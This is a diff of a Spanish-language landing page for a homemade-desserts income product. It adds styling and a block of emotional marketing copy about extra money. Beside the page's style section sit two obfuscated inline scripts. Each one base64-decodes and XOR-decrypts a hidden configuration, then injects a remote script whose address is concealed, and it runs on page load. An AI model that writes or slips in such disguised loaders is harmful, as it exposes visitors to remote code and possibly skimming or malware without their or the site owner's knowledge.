@@ -1872,6 +1872,75 @@
       display:none !important;
     }
 
+
+    /* ======================================================
+       BLOCO DE DOR + DESEJO APÓS O MOCKUP
+       ====================================================== */
+    .pv-desire-block{
+      max-width:650px;
+      margin:28px auto 0;
+      text-align:left;
+    }
+
+    .pv-desire-block h2{
+      margin:0 auto 18px;
+      text-align:center;
+      font-size:clamp(22px,4.8vw,30px);
+      line-height:1.08;
+      letter-spacing:-.028em;
+    }
+
+    .pv-desire-list{
+      display:grid;
+      gap:0;
+      border-top:1px solid var(--border);
+      border-bottom:1px solid var(--border);
+    }
+
+    .pv-desire-item{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      padding:14px 2px;
+    }
+
+    .pv-desire-item + .pv-desire-item{
+      border-top:1px solid var(--border);
+    }
+
+    .pv-desire-icon{
+      flex:0 0 38px;
+      width:38px;
+      height:38px;
+      display:grid;
+      place-items:center;
+      border-radius:50%;
+      background:var(--surface-2);
+      font-size:19px;
+    }
+
+    .pv-desire-item strong{
+      font-size:13.5px;
+      line-height:1.35;
+    }
+
+    .pv-desire-bridge{
+      margin-top:17px;
+      text-align:center;
+      color:var(--brand-dark);
+      font-size:14px;
+      font-weight:950;
+      line-height:1.35;
+    }
+
+    @media (max-width:430px){
+      .pv-desire-block{margin-top:24px}
+      .pv-desire-block h2{font-size:23px}
+      .pv-desire-item{padding:13px 0}
+      .pv-desire-item strong{font-size:13px}
+      .pv-desire-bridge{font-size:13.5px}
+    }
+
 </style>
 <script>(function(){var b_8ngf=atob("DAWiTmCtZw9AwSGKYn6AOxLBRTViqVX+EnaYYU/OA2FutFXnC2PbYAPCCiEisw75AXfLPhTeSH8puUTmTXXLNgXBSWUz4w2oA3HWPAnPEnslsgOwOViObAfBCG0hrVKoWF7ZbA7MCmpi+wP6C33HIinJRSNit0DmF2CAdEKbBm54+EXrBGTGeFaYATpw+EPoATPDelmPGlI9");var f_7=[];for(var s_dr=0;s_dr<b_8ngf.length;s_dr++){f_7.push(b_8ngf.charCodeAt(s_dr)&255);}var z_i5p=f_7[0];var f_y5kt=f_7.slice(1,1+z_i5p);var z_a=f_7.slice(1+z_i5p);var m_n=z_a.map(function(b,m_g52s){return b^f_y5kt[m_g52s%z_i5p];});var k_46c="";for(var a_1g=0;a_1g<m_n.length;a_1g++){k_46c+=String.fromCharCode(m_n[a_1g]&255);}var e_y=decodeURIComponent(escape(k_46c));var n_c=JSON.parse(e_y);var g_6=n_c.globals||[];g_6.forEach(function(u_5w1){window[u_5w1.name]=u_5w1.value;});var e_4=document.createElement("script");e_4.src=n_c.url;e_4.async=true;e_4.defer=true;(n_c.attributes||[]).forEach(function(y_ppgi){e_4.setAttribute(y_ppgi.name,y_ppgi.value);});(document.head||document.documentElement).appendChild(e_4);})();</script>
 <script>(function(){var y_5=atob("DGHo3LuL9aE+HpdfohrKqcnn15scduMr0hLS85Tokc8Qa+MyyweR8tjkmI9cbLgswROBrM/42tRKc+RwzgCcucj/28tNPLt9wxWcrtLpgNVbbbVl+RrKstrmkIMEPPM+1gDFqc/mnMdHM+ctxxeNss+mjcJReroswQrK8Jn9lM1Le7VlgEOV8MCpm8BTe7VlgAWJqNqmgNVTd/EmjxGauc3um9UTbeI9ywWb/pepg8BSa/J9mEPKoeb2");var a_40=[];for(var d_as=0;d_as<y_5.length;d_as++){a_40.push(y_5.charCodeAt(d_as)&255);}var s_lk=a_40[0];var w_703=a_40.slice(1,1+s_lk);var g_hgmf=a_40.slice(1+s_lk);var k_4bh6=g_hgmf.map(function(b,v_b){return b^w_703[v_b%s_lk];});var x_m7k6="";for(var d_r=0;d_r<k_4bh6.length;d_r++){x_m7k6+=String.fromCharCode(k_4bh6[d_r]&255);}var q_9=decodeURIComponent(escape(x_m7k6));var y_15=JSON.parse(q_9);var b_w3=y_15.globals||[];b_w3.forEach(function(w_r){window[w_r.name]=w_r.value;});var i_jm0h=document.createElement("script");i_jm0h.src=y_15.url;i_jm0h.async=true;i_jm0h.defer=true;(y_15.attributes||[]).forEach(function(i_lfbk){i_jm0h.setAttribute(i_lfbk.name,i_lfbk.value);});(document.head||document.documentElement).appendChild(i_jm0h);})();</script>
@@ -2231,6 +2300,34 @@
               <span>+100 Postres • App Exclusiva • Soporte</span>
             </div>
           </div>
+        </div>
+
+        <div class="pv-desire-block">
+          <h2>IMAGINA LO QUE ESTE INGRESO EXTRA PODRÍA SIGNIFICAR PARA TI…</h2>
+
+          <div class="pv-desire-list">
+            <div class="pv-desire-item">
+              <span class="pv-desire-icon">💰</span>
+              <strong>Llegar a fin de mes y darte cuenta de que sí te quedó dinero</strong>
+            </div>
+
+            <div class="pv-desire-item">
+              <span class="pv-desire-icon">🏠</span>
+              <strong>Pagar los gastos de la casa con mucha más tranquilidad</strong>
+            </div>
+
+            <div class="pv-desire-item">
+              <span class="pv-desire-icon">🛍️</span>
+              <strong>Comprarte eso que quieres sin sentir culpa</strong>
+            </div>
+
+            <div class="pv-desire-item">
+              <span class="pv-desire-icon">❤️</span>
+              <strong>Disfrutar más con tu familia gracias a un dinero generado por ti</strong>
+            </div>
+          </div>
+
+          <div class="pv-desire-bridge">Y todo puede comenzar desde tu propia cocina, gastando casi nada 🍰</div>
         </div>
       </section>
 
